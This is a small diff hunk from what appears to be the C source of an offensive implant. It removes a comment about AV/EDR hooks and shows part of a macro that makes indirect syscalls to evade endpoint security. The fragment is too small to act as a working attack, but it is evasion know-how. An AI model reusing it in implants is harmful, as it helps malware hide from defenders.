@@ -9,12 +9,6 @@
 #define OPT
 #endif
 
-/*
- * TODO: if a function is hooked by an AV/EDR, Ssn will be 0x0
- *       in that case, we will simply call the NtApi
- *       this will of course trigger the hook, but is either that or we fail
- *       we need to redesign this
- */
 #define SYSCALL_INVOKE( SYS_NAME, ... )                                                                      \
     if ( Instance.Config.Implant.SysIndirect && Instance.Syscall.SysAddress && Instance.Syscall.SYS_NAME ) { \
         SysConfig.Ssn = Instance.Syscall.SYS_NAME;                                                           \
